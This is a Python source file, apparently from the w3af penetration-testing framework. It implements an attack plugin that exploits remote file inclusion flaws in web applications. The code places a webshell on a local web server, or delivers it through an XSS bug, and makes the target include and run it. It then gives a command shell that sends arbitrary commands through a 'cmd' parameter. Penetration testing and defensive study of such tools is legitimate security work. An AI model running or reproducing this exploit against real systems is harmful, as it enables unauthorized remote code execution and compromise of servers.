'''
remoteFileIncludeShell.py

Copyright 2006 Andres Riancho

This file is part of w3af, w3af.sourceforge.net .

w3af is free software; you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation version 2 of the License.

w3af is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with w3af; if not, write to the Free Software
Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA  02110-1301  USA

'''


# Common includes
from core.data.fuzzer.fuzzer import createRandAlpha, createRandAlNum
import core.controllers.outputManager as om

# options
from core.data.options.option import option
from core.data.options.optionList import optionList

from core.controllers.basePlugin.baseAttackPlugin import baseAttackPlugin
import core.data.kb.knowledgeBase as kb
import core.data.parsers.urlParser as urlParser
from core.controllers.w3afException import w3afException
from core.controllers.daemons.webserver import webserver

import os
import time
import urllib

# Advanced shell stuff
from core.data.kb.shell import shell as shell
from plugins.attack.webshells.getShell import getShell

# Port definition
import core.data.constants.w3afPorts as w3afPorts

class remoteFileIncludeShell(baseAttackPlugin):
    '''
    Exploit remote file include vulnerabilities.
    @author: Andres Riancho ( andres.riancho@gmail.com )
    '''

    def __init__(self):
        baseAttackPlugin.__init__(self)
        
        # Internal variables
        self._shell = None
        self._web_server = None
        self._xss_vuln = None
        
        # User configured variables
        self._listen_port = w3afPorts.REMOTEFILEINCLUDE
        self._listen_address = ''
        self._use_XSS_vuln = False
        self._generateOnlyOne = True

    def fastExploit(self, url, method, data ):
        '''
        Exploits a web app with remote file include vuln.
        
        @parameter url: A string containing the Url to exploit ( http://somehost.com/foo.php )
        @parameter method: A string containing the method to send the data ( post / get )
        @parameter data: A string containing data to send with a mark that defines
        which is the vulnerable parameter ( aa=notMe&bb=almost&cc=[VULNERABLE] )
        '''
        return self._shell
        
    def canExploit( self, vuln_to_exploit=None):
        '''
        Searches the kb for vulnerabilities that this plugin can exploit, this is overloaded from baseAttackPlugin because
        I need to test for xss vulns also. This is a "complex" plugin.

        @parameter vuln_to_exploit: The id of the vulnerability to exploit.
        @return: True if plugin knows how to exploit a found vuln.
        '''
        if self._listen_address == '' and not self._use_XSS_vuln:
            om.out.error('remoteFileIncludeShell plugin has to be correctly configured to use.')
            return False
        
        rfi_vulns = kb.kb.getData( 'remoteFileInclude' , 'remoteFileInclude' )
        if vuln_to_exploit != None:
            rfi_vulns = [ v for v in rfi_vulns if v.getId() == vuln_to_exploit ]
        
        if len( rfi_vulns ) == 0:
            return False
        else:
            if self._use_XSS_vuln:
                if len( kb.kb.getData( 'xss' , 'xss' ) ):
                    for vuln in kb.kb.getData( 'xss' , 'xss' ):
                        # TODO: FIX THIS BUG!!! I DONT SAVE THIS DATA TO THE INFO OBJ ANYMORE!
                        if not vuln['escapesSingle'] and not vuln['escapesDouble'] and not\
                        vuln['escapesLtGt']:
                            self._xss_vuln = vuln
                            return True
                        else:
                            msg = 'remoteFileIncludeShell plugin is configured to use a XSS'
                            msg += ' bug to exploit the RFI bug, but no XSS with the required'
                            msg += ' parameters was found.'
                            om.out.error( msg )
                            return False
                else:
                    msg = 'remoteFileIncludeShell plugin is configured to use a XSS bug to'
                    msg += ' exploit the RFI bug, but no XSS was found.'
                    om.out.error( msg )
                    return False
            else:
                # Using the good old webserver
                return True
    
    def getAttackType(self):
        return 'shell'
    
    def getVulnName2Exploit( self ):
        return 'remoteFileInclude'
        
    def _generateShell( self, vuln ):
        '''
        @return: A shell object based on the vuln that is passed as parameter.
        '''
        # Check if we really can execute commands on the remote server
        if self._verifyVuln( vuln ):
            # Create the shell object
            s = rfiShell( vuln )
            s.setUrlOpener( self._urlOpener )
            s.setCut( self._header, self._footer )
            s.setWebServer( self._web_server )
            s.setExploitDc( self._exploitDc )
            return s
        else:
            return None

    def _verifyVuln( self, vuln ):
        '''
        This command verifies a vuln. This is really hard work!

        @return : True if vuln can be exploited.
        '''
        # Create the shell
        filename = createRandAlpha( 7 )
        extension = urlParser.getExtension( vuln.getURL() )
        
        # I get a list of tuples with file_content and extension to use
        shell_list = getShell( extension )
        
        for file_content, real_extension in shell_list:
            if extension == '':
                extension = real_extension

            url_to_include = self._gen_url_to_include( file_content, extension )

            self._start_web_server()
            
            # Prepare for exploitation...
            functionReference = getattr( self._urlOpener , vuln.getMethod() )
            dc = vuln.getDc()
            dc[ vuln.getVar() ] = url_to_include

            try:
                http_res = functionReference( vuln.getURL(), str(dc) )
            except:
                successfully_exploited = False
            else:
                successfully_exploited = self._defineCut( http_res.getBody(), 'w3af' , exact=True )
            
            if successfully_exploited:
                self._exploitDc = dc
                return successfully_exploited
            else:
                # Remove the file from the local webserver webroot
                self._clearWebServer( url_to_include )
                
        return False
    
    def _gen_url_to_include( self, file_content, extension ):
        '''
        Generate the URL to include, based on the configuration it will return a 
        URL poiting to a XSS bug, or a URL poiting to our local webserver.
        '''
        if self._use_XSS_vuln:
            url = urlParser.uri2url( self._xss_vuln.getURL() )
            dc = self._xss_vuln.getDc()
            dc = dc.copy()
            dc[ self._xss_vuln.getVar() ] = file_content
            url_to_include = url + '?' + str(dc)
            return url_to_include
        else:
            # Write the php to the webroot
            filename = createRandAlNum()
            try:
                f = open( os.path.join('webroot' + os.path.sep, filename ) , 'w')
                f.write( file_content )
                f.close()
            except:
                raise w3afException('Could not create file in webroot.')
            else:
                url_to_include = 'http://' + self._listen_address +':'
                url_to_include += str(self._listen_port) +'/' + filename
                return url_to_include
    
    def _clearWebServer( self, url_to_include ):
        '''
        Remove the file in the webroot and stop the webserver.
        '''
        if not self._use_XSS_vuln and self._web_server:
            self._web_server.stop()
            # Remove the file
            filename = url_to_include.split('/')[-1:][0]
            os.remove( os.path.join('webroot' + os.path.sep, filename ) )
            self._web_server = None 
    
    def _start_web_server( self ):
        if self._use_XSS_vuln:
            return
        if not self._web_server:
            webroot_path = 'webroot' + os.path.sep
            self._web_server = webserver( self._listen_address, self._listen_port, webroot_path)
            self._web_server.start2()
            time.sleep(0.2) # wait for webserver thread to start
    
    def getOptions( self ):
        '''
        @return: A list of option objects for this plugin.
        '''
        d1 = 'IP address that the webserver will use to receive requests'
        h1 = 'w3af runs a webserver to serve the files to the target web app'
        h1 += ' when doing remote file inclusions. This setting configures on what IP address the'
        h1 += ' webserver is going to listen.'
        o1 = option('listenAddress', self._listen_address, d1, 'string', help=h1)

        d2 = 'Port that the webserver will use to receive requests'
        h2 = 'w3af runs a webserver to serve the files to the target web app'
        h2 += ' when doing remote file inclusions. This setting configures on what IP address'
        h2 += ' the webserver is going to listen.'
        o2 = option('listenPort', self._listen_port, d2, 'integer', help=h2)
        
        d3 = 'Instead of including a file in a local webserver; include the result of'
        d3 += ' exploiting a XSS bug.'
        o3 = option('useXssBug', self._use_XSS_vuln, d3, 'boolean')
        
        d4 = 'If true, this plugin will try to generate only one shell object.'
        o4 = option('generateOnlyOne', self._generateOnlyOne, d4, 'boolean')
        
        ol = optionList()
        ol.add(o1)
        ol.add(o2)
        ol.add(o3)
        ol.add(o4)
        return ol

    def setOptions( self, optionsMap ):
        '''
        This method sets all the options that are configured using the user interface 
        generated by the framework using the result of getOptions().
        
        @parameter optionsMap: A map with the options for the plugin.
        @return: No value is returned.
        ''' 
        self._listen_address = optionsMap['listenAddress'].getValue()
        self._listen_port = optionsMap['listenPort'].getValue()
        self._use_XSS_vuln = optionsMap['useXssBug'].getValue()
        self._generateOnlyOne = optionsMap['generateOnlyOne'].getValue()
        
        if self._listen_address == '' and not self._use_XSS_vuln:
            om.out.error('remoteFileIncludeShell plugin has to be correctly configured to use.')
            return False
            
    def getPluginDeps( self ):
        '''
        @return: A list with the names of the plugins that should be runned before the
        current one.
        '''
        return []
    
    def getRootProbability( self ):
        '''
        @return: This method returns the probability of getting a root shell using this attack plugin.
        This is used by the "exploit *" function to order the plugins and first try to exploit the more critical ones.
        This method should return 0 for an exploit that will never return a root shell, and 1 for an exploit that WILL ALWAYS
        return a root shell.
        '''
        return 0.8
    
    def getLongDesc( self ):
        '''
        @return: A DETAILED description of the plugin functions and features.
        '''
        return '''
        This plugin exploits remote file inclusion vulnerabilities and returns a remote shell. The exploitation can be
        done using a more classic approach, in which the file to be included is hosted on a webserver that the plugin
        runs, or a nicer approach, in which a XSS bug on the remote site is used to generate the remote file to be included.
        Both ways work and return a shell, but the one that uses XSS will work even when a restrictive firewall is configured
        at the remote site.
        
        Three configurable parameters exist:
            - listenAddress
            - listenPort
            - useXssBug
            - generateOnlyOne
        '''
        
class rfiShell(shell):
    def setExploitDc( self, eDc ):
        self._exploitDc = eDc
    
    def getExploitDc( self ):
        return self._exploitDc
    
    def setWebServer( self, webserverInstance ):
        self._web_server = webserverInstance
    
    def _rexec( self, command ):
        '''
        This method is called when a command is being sent to the remote server.
        This is a NON-interactive shell.

        @parameter command: The command to send ( ie. "ls", "whoami", etc ).
        @return: The result of the command.
        '''
        eDc = self.getExploitDc()
        eDc = eDc.copy()
        eDc[ 'cmd' ] = urllib.quote_plus( command )
        
        functionReference = getattr( self._urlOpener , self.getMethod() )
        try:
            http_res = functionReference( self.getURL(), str(eDc) )
        except w3afException, w3:
            return 'Exception from the remote web application:' + str(w3)
        except Exception, e:
            return 'Unhandled exception from the remote web application:' + str(e)
        else:
            return self._cut( http_res.getBody() )
        
    def end( self ):
        om.out.debug('Remote file inclusion shell is cleaning up.')
        try:
            self._clearWebServer( self.getExploitDc()[ self.getVar() ] )
        except Exception, e:
            om.out.error('Remote file inclusion shell cleanup failed with exception: ' + str(e) )
        else:
            om.out.debug('Remote file inclusion shell cleanup complete.')
    
    def getName( self ):
        return 'rfiShell'

    def _clearWebServer( self, url_to_include ):
        '''
        TODO: This is duplicated code!! see above.
        '''
        if self._web_server:
            self._web_server.stop()
            # Remove the file
            filename = url_to_include.split('/')[-1:][0]
            os.remove( os.path.join('webroot' + os.path.sep, filename ) )
            self._web_server = None
            
